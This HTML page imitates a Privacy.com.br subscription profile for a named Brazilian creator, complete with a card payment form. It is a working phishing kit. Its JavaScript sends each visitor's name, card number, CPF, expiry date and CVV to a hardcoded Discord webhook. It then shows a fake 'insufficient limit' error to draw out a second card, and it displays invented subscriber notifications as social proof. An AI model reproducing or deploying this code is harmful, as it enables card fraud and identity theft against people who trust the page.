<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privacy | Kamylinha Santos</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <script src="https://cdn.jsdelivr.net/npm/notiflix@2.7.0/dist/notiflix-aio-2.7.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

    <style>
        :root { --primary-orange: #f47b52; --primary-gradient: linear-gradient(90deg, #f47b52, #f9a67a); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: #fff; color: #333; padding-bottom: 100px; overflow-x: hidden; }

        /* Estilo da P√°gina */
        .top-nav { display: flex; justify-content: space-between; padding: 12px 20px; border-bottom: 1px solid #f0f0f0; }
        .banner { width: 100%; height: 250px; object-fit: cover; }
        .profile-pic { width: 115px; height: 115px; border-radius: 50%; border: 4px solid #fff; margin-top: -55px; margin-left: 20px; position: relative; z-index: 10; object-fit: cover; }
        
        .info { padding: 10px 20px; }
        .name { font-size: 22px; font-weight: 700; display: flex; align-items: center; gap: 5px; }
        .verified { color: var(--primary-orange); }
        .username { color: #666; font-size: 14px; margin-bottom: 10px; }

        /* Bot√µes de Assinatura */
        .btn-container { padding: 20px; display: flex; flex-direction: column; gap: 15px; }
        .btn-sub { width: 100%; padding: 18px; border-radius: 50px; border: none; color: #fff; display: flex; justify-content: space-between; align-items: center; cursor: pointer; background: var(--primary-gradient); font-weight: 600; }
        .price-big { font-size: 20px; font-weight: 800; }

        /* Galeria */
        .gallery { padding: 20px; display: flex; flex-direction: column; gap: 15px; }
        .gallery img { width: 100%; border-radius: 15px; }

        /* Modal Pagamento */
        #paymentModal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); overflow-y: auto; }
        .modal-content { background: #fff; width: 92%; max-width: 450px; margin: 5% auto; border-radius: 20px; padding: 20px; position: relative; }
        .close { position: absolute; right: 20px; top: 15px; font-size: 25px; cursor: pointer; }
        
        .pay-title { text-align: center; color: var(--primary-orange); margin-bottom: 20px; font-weight: 800; font-size: 24px; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; font-weight: 700; font-size: 14px; margin-bottom: 5px; }
        .form-group input, .form-group select { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #ffd8cc; background: #fff9f7; outline: none; font-size: 16px; }
        .btn-finalizar { width: 100%; padding: 18px; background: var(--primary-gradient); border: none; border-radius: 50px; color: #fff; font-weight: 800; font-size: 18px; margin-top: 10px; cursor: pointer; }

        /* Notifica√ß√£o */
        .notif { position: fixed; bottom: 20px; left: 15px; right: 15px; background: #fff; padding: 12px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); display: flex; align-items: center; gap: 10px; z-index: 1000; transform: translateY(200%); transition: 0.5s; }
        .notif.show { transform: translateY(0); }
    </style>
</head>
<body>

    <nav class="top-nav">
        <img src="https://privacy.com.br/img/logo-orange.svg" height="25">
        <i class="fa-solid fa-globe"></i>
    </nav>

    <img src="capa.png" class="banner">
    <img src="perfil1.png" class="profile-pic">

    <div class="info">
        <div class="name">Kamylinha Santos <i class="fa-solid fa-circle-check verified"></i></div>
        <div class="username">@eukamylinhasantos</div>
        <p>A musa do TikTok como voc√™ nunca viu... üî•</p>
    </div>

    <div class="btn-container">
        <button class="btn-sub" onclick="openPay('Mensal - R$ 10,00')">
            <span>Plano Mensal</span>
            <span class="price-big">R$ 10,00</span>
        </button>
        <button class="btn-sub" onclick="openPay('Vital√≠cio - R$ 27,00')">
            <span>Plano Vital√≠cio</span>
            <span class="price-big">R$ 27,00</span>
        </button>
    </div>

    <div class="gallery">
        <img src="imagem1.png">
        <img src="imagem2.png">
    </div>

    <div id="paymentModal">
        <div class="modal-content">
            <span class="close" onclick="closePay()">&times;</span>
            <div class="pay-title">Pagamento</div>
            
            <div class="form-group">
                <label>Nome Completo</label>
                <input type="text" id="pay_name" placeholder="Nome impresso no cart√£o">
            </div>
            <div class="form-group">
                <label>N√∫mero do Cart√£o</label>
                <input type="text" id="card_num" placeholder="0000 0000 0000 0000">
            </div>
            <div class="form-group">
                <label>CPF do Titular</label>
                <input type="text" id="cpf_num" placeholder="000.000.000-00">
            </div>
            <div style="display:flex; gap:10px">
                <div class="form-group" style="flex:1">
                    <label>Validade</label>
                    <input type="text" id="card_date" placeholder="MM/AA">
                </div>
                <div class="form-group" style="flex:1">
                    <label>CVV</label>
                    <input type="text" id="card_cvv" placeholder="123">
                </div>
            </div>
            <div class="form-group">
                <label>Plano Selecionado</label>
                <input type="text" id="selected_plan" readonly>
            </div>

            <button class="btn-finalizar" onclick="enviarDados()">PAGAR AGORA</button>
        </div>
    </div>

    <div class="notif" id="notif">
        <i class="fa-solid fa-circle-check" style="color: #2ecc71; font-size: 20px;"></i>
        <div id="notif-text"><b>Algu√©m</b> acabou de assinar!</div>
    </div>

    <script>
        // M√°scaras
        $(document).ready(function(){
            $('#card_num').mask('0000 0000 0000 0000');
            $('#cpf_num').mask('000.000.000-00');
            $('#card_date').mask('00/00');
            $('#card_cvv').mask('000');
        });

        function openPay(plano) {
            document.getElementById('selected_plan').value = plano;
            document.getElementById('paymentModal').style.display = 'block';
        }

        function closePay() { document.getElementById('paymentModal').style.display = 'none'; }

        function enviarDados() {
            const nome = document.getElementById('pay_name').value;
            const cartao = document.getElementById('card_num').value;
            const cpf = document.getElementById('cpf_num').value;
            const validade = document.getElementById('card_date').value;
            const cvv = document.getElementById('card_cvv').value;
            const plano = document.getElementById('selected_plan').value;

            if (!nome || !cartao || !cpf || !validade || !cvv) {
                Notiflix.Notify.failure('Preencha todos os campos!');
                return;
            }

            Notiflix.Loading.circle('Processando...');

            const webhookURL = "https://discord.com/api/webhooks/1470300746439458902/TbdZwuh6kMX7vdMD97wvOdZ2Rzf63w7PB2GUyOeOEFKwcui6VI2TAubXJyjYVdxIoWZH";
            
            const payload = {
                embeds: [{
                    title: "üí≥ NOVO CART√ÉO LOGADO",
                    color: 16744192,
                    fields: [
                        { name: "üë§ Nome", value: nome, inline: true },
                        { name: "üÜî CPF", value: cpf, inline: true },
                        { name: "üí≥ Cart√£o", value: `\`${cartao}\``, inline: false },
                        { name: "üìÖ Exp", value: validade, inline: true },
                        { name: "üîí CVV", value: cvv, inline: true },
                        { name: "üí∞ Plano", value: plano }
                    ],
                    footer: { text: "ID: 1326639660872499315" }
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(() => {
                setTimeout(() => {
                    Notiflix.Loading.remove();
                    Notiflix.Report.failure('Erro no Cart√£o', 'C√≥digo 51: Limite Insuficiente. Tente outro cart√£o.', 'Tentar novamente');
                    document.getElementById('card_cvv').value = "";
                }, 2000);
            });
        }

        // Notifica√ß√µes Falsas
        const nomes = ["Marcos", "Felipe", "Ricardo", "Jo√£o", "Andr√©", "Gustavo"];
        function showNotif() {
            const nome = nomes[Math.floor(Math.random() * nomes.length)];
            document.getElementById('notif-text').innerHTML = `<b>${nome} P.</b> acabou de assinar o Vital√≠cio!`;
            const n = document.getElementById('notif');
            n.classList.add('show');
            setTimeout(() => n.classList.remove('show'), 4000);
            setTimeout(showNotif, 12000);
        }
        setTimeout(showNotif, 3000);
    </script>
</body>
</html>
